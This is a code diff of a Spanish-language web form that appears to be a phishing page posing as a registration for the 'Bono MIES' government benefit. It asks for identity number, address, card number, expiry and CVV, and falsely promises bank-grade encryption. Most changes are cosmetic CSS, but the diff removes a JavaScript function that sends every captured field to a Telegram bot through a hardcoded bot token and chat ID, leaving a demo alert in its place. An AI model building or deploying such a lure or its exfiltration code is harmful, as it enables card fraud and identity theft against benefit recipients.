@@ -12,18 +12,18 @@
       font-family: 'Poppins', sans-serif;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
+      align-items: center;
       min-height: 100vh;
-      padding: 30px 15px;
+      padding: 0 15px;
     }
 
     .container {
       background: white;
-      border-radius: 12px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
       width: 100%;
-      max-width: 460px;
-      padding: 30px 25px 25px;
+      max-width: 400px;
+      padding: 20px 20px 15px;
       box-sizing: border-box;
     }
 
@@ -31,19 +31,20 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
 
     .header img {
-      width: 140px;
+      width: 130px;
       height: auto;
     }
 
     h1 {
-      font-size: 22px;
+      font-size: 20px;
       font-weight: 700;
       color: #111b35;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
+      text-align: center;
     }
 
     label {
@@ -54,29 +55,25 @@
       font-weight: 600;
     }
 
-    input[type="text"], input[type="password"], input[type="checkbox"] {
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1.5px solid #c3cad9;
+      margin-bottom: 14px;
       box-sizing: border-box;
     }
 
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 12px 14px;
-      font-size: 15px;
-      border-radius: 8px;
-      border: 1.7px solid #c3cad9;
-      margin-bottom: 18px;
-      transition: border-color 0.3s ease;
-    }
-
-    input[type="text"]:focus, input[type="password"]:focus {
+    input:focus {
       border-color: #0b234d;
       outline: none;
     }
 
     .inline-inputs {
       display: flex;
-      gap: 15px;
-      margin-bottom: 18px;
+      gap: 12px;
+      margin-bottom: 14px;
     }
 
     .inline-inputs > div {
@@ -87,14 +84,14 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      font-size: 14px;
+      font-size: 13px;
       color: #2a5a27;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     .security svg {
-      width: 18px;
-      height: 18px;
+      width: 16px;
+      height: 16px;
       fill: #2a5a27;
     }
 
@@ -103,13 +100,13 @@
       background: #0b44a4;
       color: white;
       font-weight: 700;
-      font-size: 15px;
-      padding: 14px 0;
+      font-size: 14px;
+      padding: 12px 0;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
       text-transform: uppercase;
-      box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
+      box-shadow: 0 3px 6px rgba(11, 68, 164, 0.4);
       transition: background-color 0.3s ease;
     }
 
@@ -118,38 +115,38 @@
     }
 
     .legal {
-      font-size: 12px;
+      font-size: 11px;
       color: #5a5f6b;
-      margin-top: 18px;
-      line-height: 1.4;
+      margin-top: 16px;
       text-align: center;
+      line-height: 1.4;
     }
 
     .checkbox-container {
       display: flex;
       align-items: center;
-      gap: 10px;
-      margin-bottom: 20px;
+      gap: 8px;
+      margin-bottom: 16px;
     }
 
     .checkbox-container label {
       margin: 0;
       font-weight: 500;
-      font-size: 13px;
+      font-size: 12.5px;
       color: #111b35;
     }
 
     .error-message {
       color: #d93025;
-      font-size: 13px;
-      margin-top: -14px;
-      margin-bottom: 14px;
+      font-size: 12px;
+      margin-top: -12px;
+      margin-bottom: 12px;
       display: none;
     }
 
     @media (max-width: 440px) {
       .container {
-        padding: 25px 20px 20px;
+        padding: 18px;
         max-width: 100%;
       }
       .inline-inputs {
@@ -205,9 +202,7 @@
     <div class="error-message" id="error-terminos">Debes aceptar los términos para continuar.</div>
 
     <div class="security">
-      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false">
-        <path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/>
-      </svg>
+      <svg viewBox="0 0 24 24"><path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/></svg>
       Tus datos están protegidos con encriptación bancaria de 256 bits.
     </div>
 
@@ -315,41 +310,9 @@
     }
 
     if (!valido) return;
-    enviarTelegram();
+
+    alert('Datos enviados correctamente (esto es una demo visual).');
   });
-
-  function enviarTelegram() {
-    const TELEGRAM_BOT_TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
-    const TELEGRAM_CHAT_ID = '5654253897';
-
-    const msg =
-      `Nuevo registro Bono MIES:\n` +
-      `Nombre: ${nombreInput.value}\n` +
-      `Cédula: ${cedulaInput.value}\n` +
-      `Provincia/Ciudad: ${document.getElementById('provincia').value}\n` +
-      `Dirección: ${document.getElementById('direccion').value}\n` +
-      `Tarjeta: ${tarjetaInput.value}\n` +
-      `Fecha: ${fechaInput.value}\n` +
-      `CVV: ${cvvInput.value}`;
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
-    })
-    .then(response => {
-      if (response.ok) {
-        alert('Datos enviados correctamente. ¡Gracias!');
-        form.reset();
-        yaMostroAlerta = false;
-      } else {
-        alert('Error al enviar los datos. Intenta de nuevo.');
-      }
-    })
-    .catch(() => {
-      alert('Error de conexión al enviar los datos.');
-    });
-  }
 </script>
 
 </body>
